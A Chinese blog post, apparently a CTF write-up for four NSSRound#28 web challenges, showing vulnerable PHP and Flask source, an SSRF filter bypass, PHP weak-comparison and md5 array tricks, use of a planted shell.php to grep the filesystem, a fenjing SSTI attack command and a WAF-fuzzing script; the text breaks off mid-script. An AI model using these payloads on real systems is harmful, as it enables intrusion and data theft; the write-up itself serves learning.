@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="上周末打的nss的比赛，一共就4道web题，最后一题不会用fenjing没做出来。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSRound#28web方向wp">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/37991.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="上周末打的nss的比赛，一共就4道web题，最后一题不会用fenjing没做出来。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e170a90ba3d5a1d7e2b2f9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e1718f0ba3d5a1d7e2b320.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e1720d0ba3d5a1d7e2b32e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e174ec0ba3d5a1d7e2b513.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e16e570ba3d5a1d7e2b0ce.png">
+<meta property="article:published_time" content="2025-03-24T14:31:28.000Z">
+<meta property="article:modified_time" content="2025-03-24T15:20:18.000Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67e170a90ba3d5a1d7e2b2f9.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/37991.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NSSRound#28web方向wp | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">17</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">20</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">88</span></a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-search"></i>搜索</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/37991.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NSSRound#28web方向wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-24 22:31:28 / 修改时间：23:20:18" itemprop="dateCreated datePublished" datetime="2025-03-24T22:31:28+08:00">2025-03-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>上周末打的nss的比赛，一共就4道web题，最后一题不会用fenjing没做出来。</p>
+<span id="more"></span>
+<h1 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag在/flag路由中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only http:// URLs are allowed&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$forbidden_ips</span> = [<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ip</span>, <span class="variable">$forbidden_ips</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Access to localhost or 127.0.0.1 is forbidden&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>)]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Please provide a &#x27;url&#x27; parameter&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Please provide a &#x27;url&#x27; parameter&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
+<p>题目的意思也很明显了，就是考察ssrf，但是过滤127.0.0.1和localhost，用其他进制编码的127.0.0.1或者127.1都不行，尝试0.0.0.0发现可以，也是一种常见的绕过手段了 最后的payload</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?u</span>rl=<span class="symbol">http:</span>/<span class="regexp">/0.0.0.0/flag</span></span><br></pre></td></tr></table></figure></div>
+
+
+<h1 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;password can&#x27;t be a number&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$password</span> != <span class="number">123456</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong password&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wonderful&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);   <span class="comment"># level2.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>给出源码，就是给先用get请求接受password这个参数，这个参数不能是数字但是要等于123456，这里是弱类型比较，所以可以再后面加上%00这个空白，php在判断的时候会丢弃这个空白就能绕过了。然后ab两个md5值相同这也是常见了，但是直接用两个字符串的md5值相同在这里不行，所以用数组都返回null。最后用php伪协议可以直接读出flag(听说这是非预期解？)<br><img src="https://pic1.imgdb.cn/item/67e170a90ba3d5a1d7e2b2f9.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# echo TlNTQ1RGezQzOTE5NmE0LTUzNjItNDVhNC04NDdiLWZjYjRiOTc1OTFmY30K | base64 -d</span><br><span class="line">NSSCTF&#123;439196a4-5362-45a4-847b-fcb4b97591fc&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+<h1 id="light-pink"><a href="#light-pink" class="headerlink" title="light_pink"></a>light_pink</h1><p><img src="https://pic1.imgdb.cn/item/67e1718f0ba3d5a1d7e2b320.png"><br>给了一个留言板，问你flag 藏在哪里。显示尝试了一下sql注入，发现被ban了。然后这里的id虽然有回显，但是也没有ssti漏洞。然后在id是已经存在的1-5的时候也才有数据。用bp爆破id数字也没用。<br>在这个网页没有信息就去其他网页找找，目录扫描了一下发现一个shell.php<br><img src="https://pic1.imgdb.cn/item/67e1720d0ba3d5a1d7e2b32e.png"><br>竟然直接可以执行代码。这里环境变量中的flag是假flag<br>下一步就是利用这里的eval执行shell中的代码了，这就到我们打靶机的人的长处了。这里反弹shell不行，就直接开找吧 反正flag的格式肯定是NSSCTF<br>先用<code>find / -name &#39;*&#39; -exec grep -H &#39;NSS&#39; &#123;&#125; \; 2&gt;/dev/null </code> 这个指令的意思是从根目录&#x2F;开始找起，*找所有的文件，每个文件都执行grep指令，grep是一个匹配的工具，-H表示只输出匹配的字符 <code>&#123;&#125;</code>是一个文件占位符，因为grep命令需要在一个文件里面找，这里都代表所有的文件<code>*</code>，最后就发现flag在db.sql里面<br><img src="https://pic1.imgdb.cn/item/67e174ec0ba3d5a1d7e2b513.png"></p>
+<h1 id="Coding-Loving"><a href="#Coding-Loving" class="headerlink" title="Coding Loving"></a>Coding Loving</h1><p>这题给了个附件，给了题目的源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span></span><br><span class="line">FILTER_KEYWORDS = [<span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span>]</span><br><span class="line">TIME_LIMIT = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_forbidden_keywords</span>(<span class="params">complaint</span>):</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> FILTER_KEYWORDS:</span><br><span class="line">        <span class="keyword">if</span> keyword.lower() <span class="keyword">in</span> complaint:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;coding&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, command=command)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (abc:=request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;试一试&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        css_url = url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;style.css&#x27;</span>)</span><br><span class="line">        command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> contains_forbidden_keywords(command):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;forbidden.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Loving Music&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="subst">&#123;css_url&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Loving coding&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p class=&quot;emoji&quot;&gt;🧑‍💻&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">&#123;command&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, command=command,css_url=css_url)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;shell.html&#x27;</span>, command=cmd)</span><br></pre></td></tr></table></figure></div>
+<p>这里主要的问题在render_template这个函数，这个函数存在ssti漏洞。路由在&#x2F;test, 然后参数是<code>cmd</code>有GET和POST两种请求，但是只有POST是有用的。<br>可以直接用fenjing一把梭。fenjing是一个针对CTF比赛中Jinja SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口，省去手动测试接口，fuzz题目WAF的时间。项目地址在<a target="_blank" rel="noopener" href="https://github.com/Marven11/FenJing">https://github.com/Marven11/FenJing</a><br>研究了一会参数，最后下载之后在命令行的指令是这样的</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fenjing crack -u http:<span class="string">//node6.anna.nssctf.cn</span><span class="function">:25449</span>/test -m POST -i cmd <span class="params">--waf-keyword</span> 非法 <span class="params">--replaced-keyword-strategy</span> avoid <span class="params">--cookies</span> <span class="string">&quot;session=eyJ1c2VyIjoidGVzdCJ9.Z-Fo-A.RdSN3LH_6-rNarEwCVVUbMn7TZs&quot;</span></span><br></pre></td></tr></table></figure>
+<p>-m 指定请求方式 -i 指定参数 –waf-keyword 表示如果出现waf界面会出现的文字 –replaced-keyword-strategy 出现waf的时候的策略，这里选择不使用waf(avoid) 最后要指定cookie 然后可以执行成功，fenjing会给出payload成功后输入cat &#x2F;flag指令执行后得到flag<br><img src="https://pic1.imgdb.cn/item/67e16e570ba3d5a1d7e2b0ce.png"></p>
+<p>如果是手工也可以用下面的脚本找到黑名单和白名单</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node6.anna.nssctf.cn:26098/test&#x27;</span></span><br><span class="line">cookie = &#123;<span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJ1c2VyIjoidGVzdCJ9.Z-FVnQ.tQJGlYJwhwKcZcqBz3bWvoNi334&#x27;</span>&#125;</span><br><span class="line">pattern = string.ascii_letters + string.digits</span><br><span class="line">pattern += <span class="string">r&#x27;[\]!@#$%^&amp;*()_+\\?\,\.&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">blacklist = []</span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 pattern 中的字符逐个发送请求</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> pattern:</span><br><span class="line">    response = requests.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>: char&#125;, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt;Testing: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;检测到输入非法字符&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        blacklist.append(char)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]: <span class="subst">&#123;char&#125;</span> in blacklist&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        whitelist.append(char)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]: <span class="subst">&#123;char&#125;</span> in whitelist&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span 